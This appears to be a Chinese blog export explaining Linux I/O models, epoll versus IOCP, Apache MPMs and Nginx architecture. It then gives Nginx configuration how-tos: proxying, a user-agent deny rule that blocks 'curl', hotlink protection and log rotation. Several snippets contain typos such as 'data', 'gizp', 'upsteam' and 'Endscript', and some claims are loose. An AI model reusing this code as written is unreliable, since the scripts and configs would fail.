同步和异步:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同步和异步又是另外一个概念，它是事件本身的一个属性。还拿前面点菜为例，服务员直接跟厨师打交道，菜出来没出来，服务员直接指导，但只有当厨师将菜送到服务员手上，这个过程才算正常完成，这就是同步的事件。同样是点菜，有些餐馆有专门的传菜人员，当厨师炒好菜后，传菜员将菜送到传菜窗口，并通知服务员，这就变成异步的了。其实异步还可以分为两种：带通知的和不带通知的。前面说的那种属于带通知的。有些传菜员干活可能主动性不是很够，不会主动通知你，你就需要时不时的去关注一下状态。这种就是不带通知的异步。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于同步的事件，你只能以阻塞的方式去做。而对于异步的事件，阻塞和非阻塞都是可以的。非阻塞又有两种方式：主动查询和被动接收消息。被动不意味着一定不好，在这里它恰恰是效率更高的，因为在主动查询里绝大部分的查询是在做无用功。对于带通知的异步事件，两者皆可。而对于不带通知的，则只能用主动查询。 全异步I/O&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;回到I/O，不管是I还是O，对外设(磁盘)的访问都可以分成请求和执行两个阶段。请求就是看外设的状态信息（比如是否准备好了），执行才是真正的I/O操作。在Linux 2.6之前，只有“请求”是异步事件，2.6之后才引入AIO（asynchronous I/O ）把“执行”异步化。别看Linux/Unix是用来做服务器的，这点上比Windows落后了好多，IOCP（Windows上的AIO，效率极高）在Win2000上就有了。所以学linux的别老觉得Windows这里不好那里不好（Windows的多线程机制也由于linux）。 I/O的五种模型&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;根据以上分析，I/O可分为五种模型： 阻塞I/O：所有过程全阻塞 非阻塞I/O：如果没有数据buffer，则立即返回EWOULDBLOCK I/O复用（select和poll）：在wait和copy阶段分别阻塞 信号驱动I/O（SIGIO）：在wait阶段不阻塞，但copy阶段阻塞（信号驱动I/O，即通知） 异步I/O（aio）：完全五阻塞方式，当I/O完成是提供信号 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux上的前四种I/O模型的“执行”阶段都是同步的，只有最后一种才做到了真正的全异步。第一种阻塞式是最原始的方法，也是最累的办法。当然累与不累要看针对谁。应用程序是和内核打交道的。对应用程序来说，这种方式是最累的，但对内核来说这种方式恰恰是最省事的。还拿点菜这事为例，你就是应用程序，厨师就是内核，如果你去了一直等着，厨师就省事了（不用同时处理其他服务员的菜）。当然现在计算机的设计，包括操作系统，越来越为终端用户考虑了，为了让用户满意，内核慢慢的承担起越来越多的工作，IO模型的演化也是如此。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;非阻塞I/O ，I/O复用，信号驱动式I/O其实都是非阻塞的，当然是针对“请求”这个阶段。非阻塞式是主动查询外设状态。I/O复用里的select，poll也是主动查询，不同的是select和poll可以同时查询多个fd（文件句柄）的状态，另外select有fd个数的限制。epoll是基于回调函数的。信号驱动式I/O则是基于信号消息的。这两个应该可以归到“被动接收消息”那一类中。最后就是伟大的AIO的出现，内核把什么事都干了，对上层应用实现了全异步，性能最好，当然复杂度也最高。 各I/O模型详细介绍：阻塞I/O&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：应用程序调用一个IO函数，导致应用程序阻塞，等待数据准备好。 如果数据没有准备好，一直等待数据准备好了，从内核拷贝到用户空间,IO函数返回成功指示。这个不用多解释吧，阻塞套接字。下图是它调用过程的图示：（注，一般网络I/O都是阻塞I/O，客户端发出请求，Web服务器进程响应，在进程没有返回页面之前，这个请求会处于一直等待状态） 非阻塞I/O&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们把一个套接口设置为非阻塞就是告诉内核，当所请求的I/O操作无法完成时，不要将进程睡眠，而是返回一个错误。这样我们的I/O操作函数将不断的测试数据是否已经准备好，如果没有准备好，继续测试，直到数据准备好为止。在这个不断测试的过程中，会大量的占用CPU的时间，所有一般Web服务器都不使用这种I/O模型。具体过程如下图: I/O复用（select和poll）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;I/O复用模型会用到select或poll函数或epoll函数(Linux2.6以后的内核开始支持)，这两个函数也会使进程阻塞，但是和阻塞I/O所不同的的，这两个函数可以同时阻塞多个I/O操作。而且可以同时对多个读操作，多个写操作的I/O函数进行检测，直到有数据可读或可写时，才真正调用I/O操作函数。具体过程如下图: 信号驱动I/O（SIGIO）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，我们允许套接口进行信号驱动I/O，并安装一个信号处理函数，进程继续运行并不阻塞。当数据准备好时，进程会收到一个SIGIO信号，可以在信号处理函数中调用I/O操作函数处理数据。具体过程如下图: 异步I/O（aio）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当一个异步过程调用发出后，调用者不能立刻得到结果。实际处理这个调用的部件在完成后，通过状态、通知和回调来通知调用者的输入输出操作。具体过程如下图: 模型总结（如下图） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从上图中我们可以看出，可以看出，越往后，阻塞越少，理论上效率也是最优。其五种I/O模型中，前三种属于同步I/O，后两者属于异步I/O。 同步I/O: 阻塞I/O 非阻塞I/O I/O复用（select和poll） 异步I/O: 信号驱动I/O（SIGIO） （半异步） 异步I/O（aio） （真正的异步） 异步 I/O 和 信号驱动I/O的区别: 信号驱动 I/O 模式下，内核可以复制的时候通知给我们的应用程序发送SIGIO 消息。 异步 I/O 模式下，内核在所有的操作都已经被内核操作结束之后才会通知我们的应用程序。 Linux I/O模型的具体实现主要实现方式有以下几种： select poll epoll kqueue /dev/poll iocp &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注，其中iocp是Windows实现的，select、poll、epoll是Linux实现的，kqueue是FreeBSD实现的，/dev/poll是SUN的Solaris实现的。select、poll对应第3种（I/O复用）模型，iocp对应第5种（异步I/O）模型，那么epoll、kqueue、/dev/poll呢？其实也同select属于同一种模型，只是更高级一些，可以看作有了第4种（信号驱动I/O）模型的某些特性，如callback机制。 为什么epoll、kqueue、/dev/poll比select高级？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;答案是，他们无轮询。因为他们用callback取代了。想想看，当套接字比较多的时候，每次select()都要通过遍历FD_SETSIZE个Socket来完成调度，不管哪个Socket是活跃的，都遍历一遍。这会浪费很多CPU时间。如果能给套接字注册某个回调函数，当他们活跃时，自动完成相关操作，那就避免了轮询，这正是epoll、kqueue、/dev/poll做的。这样子说可能不好理解，那么我说一个现实中的例子，假设你在大学读书，住的宿舍楼有很多间房间，你的朋友要来找你。select版宿管大妈就会带着你的朋友挨个房间去找，直到找到你为止。而epoll版宿管大妈会先记下每位同学的房间号，你的朋友来时，只需告诉你的朋友你住在哪个房间即可，不用亲自带着你的朋友满大楼找人。如果来了10000个人，都要找自己住这栋楼的同学时，select版和epoll版宿管大妈，谁的效率更高，不言自明。同理，在高并发服务器中，轮询I/O是最耗时间的操作之一，select、epoll、/dev/poll的性能谁的性能更高，同样十分明了。 Windows or *nix （IOCP or kqueue、epoll、/dev/poll）？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;诚然，Windows的IOCP非常出色，目前很少有支持asynchronous I/O的系统，但是由于其系统本身的局限性，大型服务器还是在UNIX下。而且正如上面所述，kqueue、epoll、/dev/poll 与 IOCP相比，就是多了一层从内核copy数据到应用层的阻塞，从而不能算作asynchronous I/O类。但是，这层小小的阻塞无足轻重，kqueue、epoll、/dev/poll 已经做得很优秀了。 总结一些重点&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只有IOCP(windows实现)是asynchronous I/O，其他机制或多或少都会有一点阻塞。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;select（Linux实现）低效是因为每次它都需要轮询。但低效也是相对的，视情况而定，也可通过良好的设计改善 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;epoll(Linux实现)、kqueue（FreeBSD实现）、/dev/poll（Solaris实现）是Reacor模式，IOCP是Proactor模式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Apache 2.2.9之前只支持select模型，2.2.9之后支持epoll模型 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Nginx 支持epoll模型 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Java nio包是select模型 四、Apache Httpd的工作模式apache三种工作模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们都知道Apache有三种工作模块，分别为prefork、worker、event。 prefork：多进程，每个请求用一个进程响应，这个过程会用到select机制来通知。 worker：多线程，一个进程可以生成多个线程，每个线程响应一个请求，但通知机制还是select不过可以接受更多的请求。 event：基于异步I/O模型，一个进程或线程，每个进程或线程响应多个用户请求，它是基于事件驱动（也就是epoll机制）实现的。 prefork的工作原理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果不用“–with-mpm”显式指定某种MPM,prefork就是Unix平台上缺省的MPM.它所采用的预派生子进程方式也是 Apache1.3中采用的模式。prefork本身并没有使用到线程，2.0版使用它是为了与1.3版保持兼容性；另一方面，prefork用单独的子进程来处理不同的请求，进程之间是彼此独立的,这也使其成为最稳定的MPM之一。 worker的工作原理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;相对于prefork，worker是2.0版中全新的支持多线程和多进程混合模型的MPM。由于使用线程来处理，所以可以处理相对海量的请求，而系统资源的开销要小于基于进程的服务器。但是，worker也使用了多进程,每个进程又生成多个线程，以获得基于进程服务器的稳定性，这种MPM的工作方 式将是Apache2.0的发展趋势。 event 基于事件机制的特性&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个进程响应多个用户请求，利用callback机制，让套接字复用，请求过来后进程并不处理请求，而是直接交由其他机制来处理，通过epoll机制来通知请求是否完成；在这个过程中，进程本身一直处于空闲状态，可以一直接收用户请求。可以实现一个进程程响应多个用户请求。支持持海量并发连接数，消耗更少的资源。 五、如何提高Web服务器的并发连接处理能力&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有几个基本条件： 基于线程，即一个进程生成多个线程，每个线程响应用户的每个请求。 基于事件的模型，一个进程处理多个请求，并且通过epoll机制来通知用户请求完成。 基于磁盘的AIO（异步I/O） 支持mmap内存映射，mmap传统的web服务器，进行页面输入时，都是将磁盘的页面先输入到内核缓存中，再由内核缓存中复制一份到web服务器上，mmap机制就是让内核缓存与磁盘进行映射，web服务器，直接复制页面内容即可。不需要先把磁盘的上的页面先输入到内核缓存去。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;刚好，Nginx 支持以上所有特性。所以Nginx官网上说，Nginx支持50000并发，是有依据的。 六、Nginx优异之处简介&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;传统上基于进程或线程模型架构的web服务通过每进程或每线程处理并发连接请求，这势必会在网络和I/O操作时产生阻塞，其另一个必然结果则是对内存或CPU的利用率低下。生成一个新的进程/线程需要事先备好其运行时环境，这包括为其分配堆内存和栈内存，以及为其创建新的执行上下文等。这些操作都需要占用CPU，而且过多的进程/线程还会带来线程抖动或频繁的上下文切换，系统性能也会由此进一步下降。另一种高性能web服务器/web服务器反向代理：Nginx（Engine X），nginx的主要着眼点就是其高性能以及对物理计算资源的高密度利用，因此其采用了不同的架构模型。受启发于多种操作系统设计中基于“事件”的高级处理机制，nginx采用了模块化、事件驱动、异步、单线程及非阻塞的架构，并大量采用了多路复用及事件通知机制。在nginx中，连接请求由为数不多的几个仅包含一个线程的进程worker以高效的回环(run-loop)机制进行处理，而每个worker可以并行处理数千个的并发连接及请求。 Nginx 工作原理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Nginx会按需同时运行多个进程：一个主进程(master)和几个工作进程(worker)，配置了缓存时还会有缓存加载器进程(cache loader)和缓存管理器进程(cache manager)等。所有进程均是仅含有一个线程，并主要通过“共享内存”的机制实现进程间通信。主进程以root用户身份运行，而worker、cache loader和cache manager均应以非特权用户身份运行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主进程主要完成如下工作： 读取并验正配置信息； 创建、绑定及关闭套接字； 启动、终止及维护worker进程的个数； 无须中止服务而重新配置工作特性； 控制非中断式程序升级，启用新的二进制程序并在需要时回滚至老版本； 重新打开日志文件； 编译嵌入式perl脚本； worker进程主要完成的任务包括： 接收、传入并处理来自客户端的连接； 提供反向代理及过滤功能； nginx任何能完成的其它任务； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：如果负载以CPU密集型应用为主，如SSL或压缩应用，则worker数应与CPU数相同；如果负载以IO密集型为主，如响应大量内容给客户端，则worker数应该为CPU个数的1.5或2倍。 Nginx 架构&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Nginx的代码是由一个核心和一系列的模块组成, 核心主要用于提供Web Server的基本功能，以及Web和Mail反向代理的功能；还用于启用网络协议，创建必要的运行时环境以及确保不同的模块之间平滑地进行交互。不过，大多跟协议相关的功能和某应用特有的功能都是由nginx的模块实现的。这些功能模块大致可以分为事件模块、阶段性处理器、输出过滤器、变量处理器、协议、upstream和负载均衡几个类别，这些共同组成了nginx的http功能。事件模块主要用于提供OS独立的(不同操作系统的事件机制有所不同)事件通知机制如kqueue或epoll等。协议模块则负责实现nginx通过http、tls/ssl、smtp、pop3以及imap与对应的客户端建立会话。在Nginx内部，进程间的通信是通过模块的pipeline或chain实现的；换句话说，每一个功能或操作都由一个模块来实现。例如，压缩、通过FastCGI或uwsgi协议与upstream服务器通信，以及与memcached建立会话等。 Nginx 基础功能 处理静态文件，索引文件以及自动索引； 反向代理加速(无缓存)，简单的负载均衡和容错； FastCGI，简单的负载均衡和容错； 模块化的结构。过滤器包括gzipping, byte ranges, chunked responses, 以及 SSI-filter 。在SSI过滤器中，到同一个 proxy 或者 FastCGI 的多个子请求并发处理； SSL 和 TLS SNI 支持； Nginx IMAP/POP3 代理服务功能 使用外部 HTTP 认证服务器重定向用户到 IMAP/POP3 后端； 使用外部 HTTP 认证服务器认证用户后连接重定向到内部的 SMTP 后端； 认证方法： POP3: POP3 USER/PASS, APOP, AUTH LOGIN PLAIN CRAM-MD5; IMAP: IMAP LOGIN; SMTP: AUTH LOGIN PLAIN CRAM-MD5; SSL 支持； 在 IMAP 和 POP3 模式下的 STARTTLS 和 STLS 支持； Nginx 支持的操作系统 FreeBSD 3.x, 4.x, 5.x, 6.x i386; FreeBSD 5.x, 6.x amd64; Linux 2.2, 2.4, 2.6 i386; Linux 2.6 amd64; Solaris 8 i386; Solaris 9 i386 and sun4u; Solaris 10 i386; MacOS X (10.4) PPC; Windows 编译版本支持 windows 系列操作系统; Nginx 结构与扩展 一个主进程和多个工作进程，工作进程运行于非特权用户； kqueue (FreeBSD 4.1+), epoll (Linux 2.6+), rt signals (Linux 2.2.19+), /dev/poll (Solaris 7 11/99+), select, 以及 poll 支持； kqueue支持的不同功能包括 EV_CLEAR, EV_DISABLE （临时禁止事件）， NOTE_LOWAT, EV_EOF, 有效数据的数目，错误代码； sendfile (FreeBSD 3.1+), sendfile (Linux 2.2+), sendfile64 (Linux 2.4.21+), 和 sendfilev (Solaris 8 7/01+) 支持； 输入过滤 (FreeBSD 4.1+) 以及 TCP_DEFER_ACCEPT (Linux 2.4+) 支持； 10,000 非活动的 HTTP keep-alive 连接仅需要 2.5M 内存。 最小化的数据拷贝操作； Nginx 其他HTTP功能 基于IP 和名称的虚拟主机服务； Memcached 的 GET 接口； 支持 keep-alive 和管道连接； 灵活简单的配置； 重新配置和在线升级而无须中断客户的工作进程； 可定制的访问日志，日志写入缓存，以及快捷的日志回卷； 4xx-5xx 错误代码重定向； 基于 PCRE 的 rewrite 重写模块； 基于客户端 IP 地址和 HTTP 基本认证的访问控制； PUT, DELETE, 和 MKCOL 方法； 支持 FLV （Flash 视频）； 带宽限制； 为什么选择Nginx 在高连接并发的情况下，Nginx是Apache服务器不错的替代品: Nginx在美国是做虚拟主机生意的老板们经常选择的软件平台之一. 能够支持高达 50,000 个并发连接数的响应, 感谢Nginx为我们选择了 epoll and kqueue 作为开发模型。 Nginx作为负载均衡服务器: Nginx 既可以在内部直接支持 Rails 和 PHP 程序对外进行服务, 也可以支持作为 HTTP代理 服务器对外进行服务. Nginx采用C进行编写, 不论是系统资源开销还是CPU使用效率都比 Perlbal 要好很多。 作为邮件代理服务器: Nginx 同时也是一个非常优秀的邮件代理服务器（最早开发这个产品的目的之一也是作为邮件代理服务器）, Last.fm 描述了成功并且美妙的使用经验. Nginx 安装非常的简单 , 配置文件非常简洁（还能够支持perl语法）,Bugs 非常少的服务器: Nginx 启动特别容易, 并且几乎可以做到7*24不间断运行，即使运行数个月也不需要重新启动. 你还能够 不间断服务的情况下进行软件版本的升级 。 Nginx 的诞生主要解决C10K问题]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx代理]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F23.%20nginx%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[nginx代理1[root@lnmp ~]# vim /usr/local/nginx/conf/vhosts/proxy.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容： 123456789101112server &#123; listen 80; server_name www.baidu.com; location / &#123; proxy_pass http://180.97.33.107/; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;# access_log /home/logs/baidu.access combined;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：proxy_pass 后面跟要代理机器的 ip 。如果后端的机器有多台，还可以用 upstream 来实现负载均衡，配置如下： 12345678910111213141516upsteam baidu &#123; server 180.97.33.108:80; server 180.97.33.107:80;&#125;server &#123; listen 80; server_name www.baidu.com; location / &#123; proxy_pass http://baidu/; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;# access_log /home/logs/baidu.access combined;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： upstream 后面的名字是自定义的，这个名字会放到 proxy_pass 后面。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还可以代理一个服务器上所有域名，首先在 vhosts 目录下需要建立两个文件，一个是 servername 列表文件，一个是虚拟主机配置文件。两个文件内容分别为 1.servername1[root@lnmp ~]# vim /usr/local/nginx/conf/vhosts/servername &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容： 1server_name www.123.com www.234.com www.345.com; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;就这么简单一行，这个server_name 还可以继续添加 2.虚拟主机配置文件12345678910111213[root@lnmp ~]# vim /usr/local/nginx/conf/vhosts/proxy_all.confserver &#123; listen 80; include vhosts/servername; location / &#123; proxy_pass http://1.2.1.2/; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; access_log /dev/null;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;include vhosts/servername; 这个文件就是上边那个 servername 列表文件； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;proxy_pass http://1.2.1.2/; 就是需要做代理的服务器 ip 地址]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx禁止指定user_agent]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F22.%20nginx%E7%A6%81%E6%AD%A2%E6%8C%87%E5%AE%9Auser_agent%2F</url>
    <content type="text"><![CDATA[nginx禁止指定user_agent&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;具体配置如下： 123456location / &#123; if ($http_user_agent ~ 'curl|baidu|111111') &#123; return 403; &#125; &#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把 ~ 改为 ~* 就是不区分大小写。]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx配置防盗链]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F20.%20nginx%E9%85%8D%E7%BD%AE%E9%98%B2%E7%9B%97%E9%93%BE%2F</url>
    <content type="text"><![CDATA[nginx配置防盗链&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;防盗链也可以和配置静态文件过期时间一样，和指定文件类型不记录配置在一起。 123456789101112location ~ .*\.(gif|jpg|jpeg|png|bmp|swf|flv|rar|zip|doc|pdf|gz|bz2|xls)$&#123; expires 30d;access_log off;valid_referers none blocked server_name *.123.com *.234.com *.baidu.com;if ($invalid_referer)&#123;#deny all;return 403;rewrite ^/ http://www.example.com/nophoto.gif;&#125;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;valid_referers none blocked server_name 表示对这些域名的网站不进行盗链。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后 if ，可以 deny all 也可以 return 403，然后 rewrite 到一个403的固定网页。这样盗链文件的人访问这些文件时就会跳到 http://www.example.com/nophoto.gif 这里。当然也可以直接显示 403，即 return 403; 着两种方式 return 403 更节省资源。 123456789101112location ~ *^.+\.(gif|jpg|jpeg|png|bmp|swf|flv|rar|zip|doc|pdf|gz|bz2|xls)$&#123; expires 30d;valid_referers none blocked server_name *.123.com *.234.com *.baidu.com;if ($invalid_referer)&#123;#deny all;return 403;rewrite ^/ http://www.example.com/nophoto.gif;&#125;access_log off;&#125;]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx测试php解析]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F2.%20Nginx%E6%B5%8B%E8%AF%95php%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[Nginx测试php解析&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建测试文件： 1vim /usr/local/nginx/html/2.php &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加内容： 123&lt;?phpecho "测试php是否解析";?&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试： 12[root@localhost nginx]# curl localhost/2.php测试php是否解析 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;显示成这样，才说明 PHP 解析正常]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx 配置静态文件过期时间]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F19.%20nginx%20%E9%85%8D%E7%BD%AE%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6%E8%BF%87%E6%9C%9F%E6%97%B6%E9%97%B4%2F</url>
    <content type="text"><![CDATA[nginx 配置静态文件过期时间&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以把指定文件类型不记录日志和该功能一起配置。 1234567891011location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$&#123; expires 30d; access_log off;&#125;location ~ .*\.(js|css)$&#123; expires 12h; access_log off;&#125;]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx日志切割]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F18.%20nginx%E6%97%A5%E5%BF%97%E5%88%87%E5%89%B2%2F</url>
    <content type="text"><![CDATA[nginx日志切割&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nginx 没有 apache自动切割的工具，只有写脚本，也可以借助 centos 自带的日志归档工具 logrotate 。 1.nginx 日志切割脚本&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先确定访问日志路径，假定为 /tmp/axxess.log ，还要确定 nginx 的 pid 文件所在路径，假定为 /usr/local/nginx/var/nginx.pid。下面开始写日志 12345678910[root@lnmp ~]# vim /usr/local/sbin/nginx_logrotate.sh#!/bin/bashd=`data -d "-1 day" +%F`[ -d /tmp/nginx_log ] || mkdir /tmp/nginx_logmv /tmp/access.log /tmp/nginx_log/$d.log/etc/init.d/nginx reload &gt; /dev/nullcd /tmp/nginx_log/gizp -f $d.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;d=data -d &quot;-1 day&quot; +%F 表示时间，切割前一天的日志； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;[ -d /tmp/nginx_log ] || mkdir /tmp/nginx_log 判断归档目录存在不存在，存在就进行下一步，不存在就创建； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mv /tmp/access.log /tmp/nginx_log/$d.log 把日志移动到归档目录，文件名$d根据时创建； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/init.d/nginx reload &gt; /dev/null 移动日志以后需要重新创建access.log 重新加载 nginx 就可以，然后把重新加载的输出日志重定向到 /dec/null； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cd /tmp/nginx_log/ 进入归档目录； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cd /tmp/nginx_log/ 如果日志比较大，压缩归档文件方便保存，-f 表示强制覆盖。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后写一个计划任务，每天0点0分执行脚本。 123[root@lnmp ~]# crontab -e0 0 * * * /bin/bash /usr/local/sbin/nginx_logrotate.sh 2.借助系统的 logrotate 工具实现1[root@lnmp ~]# vim /etc/logrotate.d/nginx &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容： 12345678910111213/tmp/*.log &#123;DailyMissingokrotate 52compressdelaycompressnotifemptycreate 644 nobody nobodysharedscriptspostrotate[ -f /usr/local/nginx/var/nginx.pid ] &amp;&amp; kill -USR1 `cat /usr/local/nginx/var/nginx.pid`Endscript&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： daily 表示日志按天归档； missingok 表示忽略所有错误，比如日志文件不存在的情况下； rotate 52 表示存放的日志个数，最多就52个，最老的会被删除； compress 表示日志要压缩； delaycopress 表示压缩除了当前和最近之外的所有其他版本； notifempty 表示如果日志为空，则不归档； create 644 nobody nobody 定义归档日志的权限以及属主和属组； sharedscripts 表示所有的日志共享该脚本，因为这里指定的日志文件为多个，用来*.log； portrotate 后边跟轮换过日志之后要运行的命令； endscript 表示结束了。]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx 不记录指定文件类型的日志]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F17.%20nginx%20%E4%B8%8D%E8%AE%B0%E5%BD%95%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%97%A5%E5%BF%97%2F</url>
    <content type="text"><![CDATA[nginx 不记录指定文件类型的日志&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;先看看 nginx 日志相关配置 1.日志格式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 nginx.conf 中定义日志格式 1[root@lnmp ~]# vim /usr/local/nginx/conf/nginx.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置如下： 123log_format combined_realip '$remote_addr $http_x_forwarded_for [$time_local]''$host "$request_uri" $status''"$http_referer" "$http_user_agent"'; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：remote_addr 表示远程的 ip ；http_x_forwarded_for 表示代理的 ip ；time_local 表示时间；host 表示域名；request_uri 表示访问的地址；status 表示状态码；http_referer 表示referer ； http_user_agent 表示user_agent用户代理； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个格式该怎么去使用，在虚拟主机配置文件 1[root@lnmp ~]# vim /usr/local/nginx/conf/vhosts/123.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加内容 1access_log /tmp/access.log combined_realip; 123[root@lnmp ~]# service nginx configtest[root@lnmp ~]# service nginx reload[root@lnmp ~]# curl -x127.0.0.1:80 www.123.com/1234 -I &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样 /tmp 下就会生成 access.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面的日志格式，会记录代理的 ip 和 真实客户端真实 ip ，建议使用 123log_format combined_realip '$proxy_add_x_forwarded_for - $remote_user [$time_local]''"$request" $status $body_byres_sent''"$http_referer" "$http_user_agent"'; 2.错误日志 error_log 日志级别&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在常见的502中已经提到过这个概念。error_log 级别分为 debug，info，notice，warn，error，crit 默认为 crit ，该级别在日志名后边定义格式如下： 1error_log /usr/local/nginx/logs/nginx_error.log crit; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;crit 记录的日志最少，而 debug 记录的日志最多。如果 nginx 遇到一些问题，比如 502 比较频繁出现，但是看默认的 error_log 并没有看到有意义的信息，那么就可以调一下错误日志的级别，当调成 error 级别时，错误日志记录的内容会更加丰富。 3.某些类型的文件不记录日志&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改虚拟主机配置文件 1[root@lnmp ~]# vim /usr/local/nginx/conf/vhosts/123.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置内容： 1234location ~ .*\.(gif|jpg|jpeg|png|bmp|swf|js|css)$ &#123; access.log off; &#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就不会记录以上类型的日志，其实 static 和cache 的相关日志也可以禁止]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx的301与302如何配置]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F16.%20nginx%E7%9A%84301%E4%B8%8E302%E5%A6%82%E4%BD%95%E9%85%8D%E7%BD%AE%2F</url>
